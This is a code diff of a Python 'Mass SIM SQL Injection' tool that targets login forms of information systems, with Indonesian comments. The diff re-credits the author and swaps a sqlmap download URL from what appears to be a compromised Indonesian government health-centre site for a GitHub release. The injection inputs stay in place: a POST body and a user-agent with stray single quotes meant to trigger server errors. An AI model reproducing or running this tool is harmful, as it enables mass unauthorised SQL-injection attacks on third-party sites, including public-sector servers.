@@ -66,14 +66,14 @@ def depen():
                 
     elif os_plat == 'Windows':
         sqlwin = os.path.exists('.sqlmap')
-        os.system('title Mass SIM SQL Injection - Coded by root@x-krypt0n-x - System of Pekalongan')
+        os.system('title Mass SIM SQL Injection - Coded by x0rr')
         if sqlwin == True:
             pass
         elif sqlwin == False:
             pwd = os.getcwd()
             print(c.r + c.b + "[!] Something missing, Try to download it ..." + c.res)
             print(c.g + c.b + "[*] Downloading ...")
-            u = "http://puskesmaskajen1.pekalongankab.go.id/components/com_contenthistory/src/Controller/sqlmap-master.zip"
+            u = "https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.9.zip"
             down = wget.download(u, "requ.zip")
             print('\n' + c.res)
             BanSim()
@@ -109,13 +109,13 @@ def BanSim():
             )_/        \          /
            (@           `--------`
            
-           Coded by root@x-krypt0n-x | System of Pekalongan
+           		  Coded by x0rr
                         SIM SQL INJECTION""" + c.res)
 
 post_data = {"usr": "a", "pwd": "a", "FBD": "Masuk"} # post data yang akan dikirim ke server
-param = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'"} # user-agent yang terinjeksi ' untuk mentrigger error 500}
+param = {"user-agent": "Mozilla/5.0 (X11; Othros Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'"} # user-agent yang terinjeksi ' untuk mentrigger error 500}
 post_data2 = {"usr": "a", "pwd": "a'", "FBD": "Masuk"} # post data yang terinjeksi ' untuk mentrigger error
-param2 = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"} # user-agent yang tidak terinjeksi
+param2 = {"user-agent": "Mozilla/5.0 (X11; Othros Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"} # user-agent yang tidak terinjeksi
     
 BanSim()
 depen()
